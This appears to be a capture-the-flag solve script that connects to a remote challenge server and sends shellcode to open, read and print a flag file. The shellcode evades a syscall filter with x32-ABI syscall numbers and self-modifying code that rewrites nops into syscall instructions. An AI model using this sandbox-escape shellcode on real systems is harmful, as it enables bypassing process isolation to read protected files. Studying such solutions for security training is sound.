#!/usr/bin/python2
from pwn import *

context.arch = 'amd64'
# e = ELF('./chall')
# p = process('./sb5')
p = remote("103.145.226.170", 3002)

__X32_SYSCALL_BIT = 0x40000000
execute = 0x0000000000400B26

s = '''
movabs rax, 0x000067616c662f2e
push rax
push rsp
pop rdi
xor rsi, rsi
xor rdx, rdx
mov rax, 2
or rax, 0x40000000
xor word ptr[rip], 0x959f
nop
nop

add rsp, 3000

mov rdi, rax
xor rax, rax
mov rsi, rsp
mov rdx, 100
or rax, 0x40000000
xor word ptr[rip], 0x959f
nop
nop

mov rax, 1
or rax, 0x40000000
mov rdi, 1
xor word ptr[rip], 0x959f
nop
nop
'''

#raw_input()
p.sendafter('>',asm(s))

p.interactive()